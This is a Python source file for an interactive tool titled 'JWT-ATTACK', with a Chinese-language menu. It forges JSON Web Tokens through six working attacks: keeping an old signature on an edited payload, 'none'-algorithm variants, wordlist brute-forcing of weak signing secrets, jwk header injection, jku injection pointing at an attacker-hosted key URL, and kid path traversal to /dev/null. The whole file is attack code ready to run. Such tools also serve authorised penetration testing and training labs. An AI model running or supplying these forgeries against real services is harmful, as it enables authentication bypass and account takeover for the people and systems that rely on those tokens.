import json,jwt,base64
import pyfiglet,sys
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

tips = """
Options:
       1 : 接受任意签名JWT
       2 : 接受无签名的JWT
       3 : 暴力破解弱密钥
       4 : jwk参数注入
       5 : jku参数注入
       6 : kid路径遍历
"""

alg = ''

def fro():
  print('========================================================================')
  # fonts = ["ansi_shadow","ansi_regular","avatar","banner3-D","bear","big","big_money-ne","big_money-nw","blocky","braced","univers","small_slant","doom","dos_rebel"]
  text = "JWT-ATTACK"
  print(pyfiglet.figlet_format(text, font="slant"), end='')
  print('                                                             version:1.0')
  print('#' + '公众号:【Yuthon】' + '\n' + '                 ~~~路漫漫其修远兮,吾将上下而求索~~~')
  print('========================================================================' + '\n' + tips)

#检查数组下标问题
def is_index_valid(sequence, index):
  return 0 <= index < len(sequence)

def change_key_value(jwt_token:dict):
  while True:
    key_num = []
    for index, key in enumerate(jwt_token.keys()):
      print(f"Index: {index}, Key: {key} , Value: {jwt_token[key]}")
      key_num.append(key)
    # for index,key in enumerate(key_num):
    #   print(f"Index: {index}, Key: {key}")
    m_key_number = int(input("请选择你要修改的key(输入0退出):"))
    if m_key_number == 0:
      return jwt_token
    if is_index_valid(key_num, m_key_number):
      m_key_value = str(input("请输入你要修改为的值:"))
      jwt_token[key_num[m_key_number]] = m_key_value
      print("------------------------------------------------------------------------")
      print("【Modified payload】:")
    else:
      print("所选key number不存在,请重新输入")

def unverified_signature():
  token = input("请输入你的token:\n")
  print("------------------------------------------------------------------------")
  # Decode the token (without verifying)
  print("【Decoded payload】:")
  # Modify the token (JWT manipulation)
  header, payload, signature = token.split('.')
  decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
  json_de_token = json.loads(decoded_payload)
  json_de_token = change_key_value(json_de_token)
  print("------------------------------------------------------------------------")
  modified_payload = json.dumps(json_de_token).encode()
  # Generate a new token with the modified payload (re-encode)
  modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
  modified_token = f"{header}.{modified_payload_b64}.{signature}"
  print(f"【Modified token】:\n{modified_token}\n")

def flawed_none_signature_verification():
  # Paste JWT token here
  token = input("请输入你的JWT:\n")

  # Decode the token (without verifying)
  decoded_token = jwt.decode(token, options={"verify_signature": False})
  print("【Decoded payload】:")

  # Modify the token (JWT manipulation)
  header, payload, signature = token.split('.')
  decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
  json_de_token = json.loads(decoded_payload)
  json_de_token = change_key_value(json_de_token)
  algorithm_options = ['None','none','NONE','nOnE','nOne']
  # Generate a new token with the modified payload (re-encode)
  # Re-encode the JWT with None algorithm
  for index,algorithm in enumerate(algorithm_options):
    header = {"alg": f"{algorithm}", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(json_de_token).encode()).rstrip(b'=').decode()
    unsigned_token = f"{header_b64}.{modified_payload_b64}."
    print(f"Modified token ({index}) [{algorithm}]: {unsigned_token}\n")

def weak_signing_key():
  # Paste JWT token here
  jwt_token = input("请输入你的JWT:\n")
  wordlist_file = '.\\JWT_wordlist.txt'
  # Start fuzzing
  found_key = fuzz_secret_key(wordlist_file,jwt_token)
  if found_key:
    print(f"\nSecret key found: {found_key}")
    header, payload, signature = jwt_token.split('.')
    decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
    json_de_token = json.loads(decoded_payload)
    json_de_token = change_key_value(json_de_token)
    #使用找到的密钥对修改后的jwt重新签名
    modified_token = jwt.encode(json_de_token,found_key,algorithm=alg).decode()
    print(f"\nModified token [{alg}]: {modified_token}")
  else:
    print("No valid secret key found.")

def attempt_fuzzing(secret_key, algorithm,jwt_token):
  try:
    decoded = jwt.decode(jwt_token, secret_key, algorithms=[algorithm])
    # print(f"Valid key found: {secret_key}")
    return True
  except jwt.InvalidSignatureError:
    return False

def fuzz_secret_key(wordlist,jwt_token):
  header = jwt.get_unverified_header(jwt_token)
  algorithm = header.get("alg")
  global alg
  alg = algorithm
  if not algorithm:
    print("Algorithm not found in JWT header.")
    return None
  else:
    print(f"Algorithm: {algorithm}")
  with open(wordlist, "r",encoding='utf-8') as file:
    for line in file:
      secret_key = line.strip()
      if attempt_fuzzing(secret_key, algorithm,jwt_token):
        return secret_key
  return None

def jwk_injection():
  jwt_token = input("请输入你的JWT:\n")
  with open('.\keys\public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
      f.read(),
      backend=default_backend()
    )
  # Step 3: Decode the JWT
  decoded_token = jwt.decode(jwt_token, options={"verify_signature": False})
  print("------------------------------------------------------------------------")
  print(f"【Decoded token】: {json.dumps(decoded_token)}")
  decoded_header = jwt.get_unverified_header(jwt_token)
  print(f"【Decoded header】: {json.dumps(decoded_header)}")
  print("------------------------------------------------------------------------")

  # Step 4: Modify the token (JWT manipulation)
  decoded_token = change_key_value(decoded_token)
  print(f"Modified token: {decoded_token}\n")

  # Step 5: Sign the modified JWT using your RSA private key and embed the public key in the JWK header
  with open('.\keys\private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
      f.read(),
      password=None,
      backend=default_backend()
    )

  # Extract the necessary information from the private key
  public_key = private_key.public_key()
  public_numbers = public_key.public_numbers()

  # Build the JWK header
  jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(
      b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(
      b'=').decode('utf-8')
  }

  # Step 6: Generate the modified token
  modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256',
                              headers={'jwk': jwk, 'kid': decoded_header['kid']})

  # Print the modified token header
  print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")

  # Print the final token
  print("Final Token: " + modified_token.decode())

def jku_injection():
  jwt_token = input("请输入你的JWT:\n")
  jku_url = input("请输入你的JWK_KEYS存储的url:\n")
  with open('.\keys\public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
      f.read(),
      backend=default_backend()
    )
  # Decode the JWT
  decoded_token = jwt.decode(jwt_token, options={"verify_signature": False})
  print("------------------------------------------------------------------------")
  print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}")
  decoded_header = jwt.get_unverified_header(jwt_token)
  print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}")
  print("------------------------------------------------------------------------")

  decoded_token = change_key_value(decoded_token)
  # Modify the token (JWT manipulation)
  print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")

  # Sign the modified JWT using your RSA private key
  with open('.\keys\private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
      f.read(),
      password=None,
      backend=default_backend()
    )

  # Extract the necessary information from the keys
  public_key = private_key.public_key()
  public_numbers = public_key.public_numbers()

  # Build the JWKs
  jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(
      b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(
      b'=').decode('utf-8')
  }
  keys = {"keys": [jwk]}
  print(f"JWK:\n{json.dumps(keys, indent=4)}\n")
  # Generate the modified token
  modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})
  # Print the modified token header
  print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")
  # Print the final token
  print("Final Token: \n" + modified_token.decode())

def kid_traversal():
  token = input("请输入你的JWT:\n")

  # Decode the token (without verifying)
  decoded_token = jwt.decode(token, options={"verify_signature": False})
  print(f"Decoded token: {decoded_token}\n")

  # Modify the token (JWT manipulation)
  decoded_token = change_key_value(decoded_token)
  print(f"Modified payload: {decoded_token}\n")
  str_path = '../'
  for i in range(3):
  # Generate a new token with the modified payload and added header parameter (re-encode)
    modified_token = jwt.encode(decoded_token, '', algorithm='HS256', headers={"kid": f"../../../{str_path*i}dev/null"})
    print(f"Modified token({i}) [../../../{str_path*i}]: {modified_token.decode()}\n")

def attack():
  while(True):
    type = int(input("请输入你要使用的攻击类型(输入0退出):"))
    if type == 1:
      unverified_signature()
    elif type == 2:
      flawed_none_signature_verification()
    elif type == 3:
      weak_signing_key()
    elif type == 4:
      jwk_injection()
    elif type == 5:
      jku_injection()
    elif type == 6:
      kid_traversal()
    if type == 0:
      sys.exit(1)


if __name__ == '__main__':
  fro()
  attack()

